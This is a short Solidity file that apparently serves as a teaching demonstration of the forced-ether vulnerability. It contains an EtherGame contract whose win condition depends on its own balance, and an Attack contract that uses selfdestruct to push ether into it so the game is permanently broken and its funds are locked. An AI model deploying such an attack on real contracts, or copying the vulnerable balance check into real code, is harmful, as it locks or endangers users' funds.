// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

contract EtherGame{
    uint public target_Amount = 7 ether;

    address public winner;
    ///not more than 1 ether
    error error1();

    ///contract balance is greater than target amount
    error error2();

    ///you are not the winner
    error error3();

    

    function deposit() external payable{
        if(msg.value>1 ether){
            revert error1();
        }
        uint balance = address(this).balance;

        if(balance>target_Amount){
            revert error2();
        }

        if(balance==target_Amount){
            winner=msg.sender;
        }
    }

    function claimRewards() external {
        if(winner!=msg.sender){
            revert error3();
        }

        (bool sent ,) = msg.sender.call{value:address(this).balance}("");

        if(!sent){
            revert();
        }
    }
}

contract Attack{
    EtherGame ethergame;

    constructor(EtherGame _ethergame){
        ethergame = _ethergame;
    }
    
    function attack() external payable{
         address payable add = payable(address(ethergame));

         selfdestruct(add);
    }

}